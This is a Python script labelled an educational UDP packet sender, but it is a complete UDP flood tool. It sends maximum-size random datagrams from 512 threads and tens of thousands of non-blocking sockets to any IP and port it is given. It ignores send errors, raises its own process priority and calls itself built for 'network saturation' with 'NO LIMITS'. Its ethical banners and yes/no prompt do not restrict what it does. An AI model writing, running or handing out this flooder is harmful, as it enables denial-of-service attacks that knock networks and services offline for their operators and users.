#!/usr/bin/env python
"""
UDP Packet Sender - Educational Tool

This script demonstrates how UDP packets work for educational purposes only.
It is designed with strict ethical limitations and should only be used on systems
you own or have explicit permission to test.

ETHICAL USAGE GUIDELINES:
1. Only use on your own systems or systems you have explicit permission to test
2. Never use against production systems or public services
3. Always comply with local laws and regulations
4. This tool is for educational purposes only

DISCLAIMER:
The author does not take responsibility for any misuse of this tool.
Unauthorized network scanning or flooding is illegal in most jurisdictions.
"""

from __future__ import print_function  # For Python 2 compatibility

import socket
import time
import sys
import random
import threading
import os
from datetime import datetime

# Python 2/3 compatibility
PY2 = sys.version_info[0] == 2
if PY2:
    input = raw_input
    # For Python 2, we need to implement our own ip_address validation
    def ip_address(ip_string):
        """Simple IP address validation for Python 2."""
        parts = ip_string.split('.')
        if len(parts) != 4:
            raise ValueError("IPv4 address should have 4 parts")
        for part in parts:
            try:
                num = int(part)
                if num < 0 or num > 255:
                    raise ValueError("Each part must be 0-255")
            except ValueError:
                raise ValueError("Each part must be an integer")
        return ip_string
else:
    # Python 3
    from ipaddress import ip_address


class UDPPacketSender:
    def __init__(self, target_ip, target_port, duration):
        """Initialize the UDP packet sender with target parameters."""
        try:
            # Validate IP address
            ip_address(target_ip)
            self.target_ip = target_ip
        except ValueError:
            print("Error: Invalid IP address: %s" % target_ip)
            sys.exit(1)
            
        # Validate port
        try:
            port = int(target_port)
            if not (1 <= port <= 65535):
                print("Error: Port must be between 1-65535, got %d" % port)
                sys.exit(1)
            self.target_port = port
        except ValueError:
            print("Error: Port must be a number")
            sys.exit(1)
        
        # Validate duration
        try:
            self.duration = float(duration)
            if self.duration <= 0:
                print("Error: Duration must be positive")
                sys.exit(1)
        except ValueError:
            print("Error: Duration must be a number")
            sys.exit(1)
            
        # ABSOLUTE MAXIMUM PERFORMANCE SETTINGS - NO NETWORK LIMITS
        self.packet_size = 65507  # Maximum UDP packet size
        self.threads = 512  # Extreme thread count for network saturation
        self.sockets_per_thread = 64  # Maximum sockets for bandwidth utilization
        self.ports_per_thread = 32  # Maximum source ports for network throughput
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.packets_sent = 0
        self.bytes_sent = 0
        
        # Pre-generate packet data
        if PY2:
            self.packet = ''.join(chr(random.randint(0, 255)) for _ in range(self.packet_size))
        else:
            self.packet = bytes(random.randint(0, 255) for _ in range(self.packet_size))
        
        # Try to set process priority to highest possible
        try:
            if sys.platform == 'win32':
                try:
                    # Try to import and use psutil
                    import psutil
                    p = psutil.Process(os.getpid())
                    p.nice(psutil.REALTIME_PRIORITY_CLASS)
                except:
                    # Fall back to Windows API if psutil is not available
                    import ctypes
                    ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000100)
            else:
                # On Unix systems
                os.nice(-20)  # Lowest nice value = highest priority
        except:
            pass  # Ignore if we can't set priority
    
    def create_socket(self):
        """Create an optimized UDP socket."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Maximum performance socket options - No limits
        try:
            # Set maximum possible send buffer
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 33554432)  # Increased to 32MB buffer
            
            # Set low delay
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)  # LOWDELAY
            
            # Disable blocking for maximum speed
            sock.setblocking(0)
            
            # Maximum priority
            if hasattr(socket, 'SO_PRIORITY'):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_PRIORITY, 7)
                
            # Try to set NODELAY
            if hasattr(socket, 'TCP_NODELAY'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                
        except:
            pass  # Ignore any errors - continue at maximum speed
            
        return sock
    
    def sender_thread(self, thread_id):
        """Thread function to send UDP packets using multiple sockets."""
        # Create multiple sockets for this thread
        sockets = []
        for i in range(self.sockets_per_thread):
            try:
                sock = self.create_socket()
                
                # Try to bind to different source ports if possible
                if i < self.ports_per_thread:
                    try:
                        # Use different source ports to potentially increase throughput
                        # Start from port 10000 to avoid privileged ports
                        source_port = 10000 + (thread_id * self.ports_per_thread) + i
                        if source_port < 65535:
                            sock.bind(('0.0.0.0', source_port))
                    except:
                        pass  # Ignore binding errors
                        
                sockets.append(sock)
            except:
                continue  # Just skip failed sockets
        
        if not sockets:
            return  # Just exit if no sockets were created
            
        # Get the pre-generated packet
        packet = self.packet
        packet_len = len(packet)
        
        # Prepare destination address
        dest = (self.target_ip, self.target_port)
        
        # Send packets as fast as possible until stop event is set
        local_count = 0
        socket_count = len(sockets)
        
        while not self.stop_event.is_set():
            # Send on all sockets in a tight loop
            for sock_idx in range(socket_count):
                try:
                    # Send multiple packets per socket in a tight loop
                    sock = sockets[sock_idx]
                    for _ in range(500):  # Massive burst per socket
                        sock.sendto(packet, dest)
                        local_count += 1
                except:
                    # Ignore any errors and continue at maximum speed
                    continue
            
            # Update counters less frequently to minimize overhead
            if local_count >= 50000:
                with self.lock:
                    self.packets_sent += local_count
                    self.bytes_sent += local_count * packet_len
                local_count = 0
                
        # Final update of counters
        if local_count > 0:
            with self.lock:
                self.packets_sent += local_count
                self.bytes_sent += local_count * packet_len
                
        # Clean up
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def start_sending(self):
        """Start multiple threads to send UDP packets."""
        print("\nETHICAL REMINDER: Only use on systems you own or have permission to test!\n")
        print("Starting UDP packet sending to %s:%d" % (self.target_ip, self.target_port))
        print("Duration: %.2f seconds, Packet size: %d bytes" % (self.duration, self.packet_size))
        print("Threads: %d, Sockets per thread: %d (Total sockets: %d)" % 
              (self.threads, self.sockets_per_thread, self.threads * self.sockets_per_thread))
        print("ABSOLUTE MAXIMUM PERFORMANCE MODE - NO LIMITS")
        print("-" * 60)
        
        # Create and start sender threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.sender_thread, args=(i,))
            t.daemon = True  # Thread will exit when main thread exits
            threads.append(t)
            t.start()
            
        # Monitor and report progress
        start_time = time.time()
        try:
            last_packets = 0
            last_bytes = 0
            last_time = start_time
            
            while time.time() - start_time < self.duration:
                time.sleep(0.1)  # Update stats very frequently
                
                current_time = time.time()
                elapsed = current_time - start_time
                remaining = max(0, self.duration - elapsed)
                
                # Calculate current rate
                with self.lock:
                    current_packets = self.packets_sent
                    current_bytes = self.bytes_sent
                
                delta_packets = current_packets - last_packets
                delta_bytes = current_bytes - last_bytes
                delta_time = current_time - last_time
                
                if delta_time > 0:
                    pps = delta_packets / delta_time
                    mbps = (delta_bytes * 8) / (delta_time * 1000000)
                    gbps = mbps / 1000
                    
                    print("[%s] Rate: %.2f Gbps (%.2f Mbps) - %.1fs remaining" % 
                          (datetime.now().strftime('%H:%M:%S'), gbps, mbps, remaining))
                    
                last_packets = current_packets
                last_bytes = current_bytes
                last_time = current_time
                
        except KeyboardInterrupt:
            print("\nPacket sending interrupted by user")
        finally:
            # Signal threads to stop
            self.stop_event.set()
            
            # Print summary
            elapsed_time = time.time() - start_time
            self.print_summary(elapsed_time)
    
    def print_summary(self, elapsed_time):
        """Print summary of the packet sending operation."""
        print("\n" + "=" * 60)
        print("UDP Packet Sending Summary:")
        print("Target: %s:%d" % (self.target_ip, self.target_port))
        print("Packets sent: %d" % self.packets_sent)
        print("Packet size: %d bytes" % self.packet_size)
        
        mb_sent = self.bytes_sent / (1024 * 1024)
        gb_sent = mb_sent / 1024
        print("Total data sent: %.2f GB (%.2f MB)" % (gb_sent, mb_sent))
        print("Time elapsed: %.2f seconds" % elapsed_time)
        
        if elapsed_time > 0:
            mbps = (self.bytes_sent * 8) / (elapsed_time * 1000000)
            gbps = mbps / 1000
            pps = self.packets_sent / elapsed_time
            print("Average sending rate: %.2f Gbps (%.2f Mbps)" % (gbps, mbps))
            print("Packets per second: %.0f" % pps)
        
        print("=" * 60)


def main():
    """Simple main function to get IP, port and duration."""
    # Print ethical banner
    print("\n" + "=" * 80)
    print("UDP PACKET SENDER - EDUCATIONAL TOOL".center(80))
    print("=" * 80)
    print("ETHICAL USAGE WARNING:".center(80))
    print("This tool is for educational purposes only.".center(80))
    print("Only use on systems you own or have explicit permission to test.".center(80))
    print("Unauthorized network scanning or flooding is illegal.".center(80))
    print("=" * 80 + "\n")
    
    # Get parameters
    if len(sys.argv) == 4:
        target_ip = sys.argv[1]
        target_port = sys.argv[2]
        duration = sys.argv[3]
    else:
        print("Usage: python %s <target_ip> <target_port> <duration_seconds>" % sys.argv[0])
        print("Example: python %s 127.0.0.1 8080 5" % sys.argv[0])
        sys.exit(1)
    
    # Confirm ethical usage
    confirm = input("Do you confirm that you are using this tool ethically and have permission "
                   "to send packets to the specified target? (yes/no): ")
    if confirm.lower() not in ["yes", "y"]:
        print("Operation cancelled. Ethical usage not confirmed.")
        sys.exit(0)
    
    # Create and run the UDP packet sender
    sender = UDPPacketSender(target_ip, target_port, duration)
    sender.start_sending()


if __name__ == "__main__":
    main()
